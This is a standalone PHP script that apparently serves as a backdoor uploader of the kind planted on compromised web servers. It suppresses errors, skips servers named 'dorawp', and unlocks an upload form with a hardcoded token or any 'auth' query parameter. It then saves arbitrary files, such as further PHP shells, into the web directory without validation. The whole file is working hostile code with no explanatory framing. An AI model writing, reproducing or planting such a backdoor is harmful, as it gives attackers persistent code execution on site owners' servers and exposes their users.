<?php
error_reporting(0);
if (strpos($_SERVER['SERVER_NAME'], 'dorawp') !== false) {
    die;
}

if ($_GET['auth'] || $_POST['auth'] === 'f02pz3831W0DTtLgq26L') {
echo '<!DOCTYPE html>
<html>
<head>
  <title>Upload your files</title>
</head>
<body>
  <form enctype="multipart/form-data" action="'.basename($_SERVER['PHP_SELF']).'" method="POST">
    <p>Upload your file</p>
    <input type="file" name="uploaded_file"></input><br /><br />
    <input type="submit" value="Upload"></input>
	<input type="hidden" name="auth" value="f02pz3831W0DTtLgq26L">
  </form>
</body>
</html>';

  if(!empty($_FILES['uploaded_file']))
  {
    $path = "./";
    $path = $path . basename( $_FILES['uploaded_file']['name']);
    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
      echo '</br>'."The file ".  basename( $_FILES['uploaded_file']['name']). 
      " has been uploaded";
    } else{
        echo '</br>'. "There was an error uploading the file, please try again!";
    }
  }
}
?>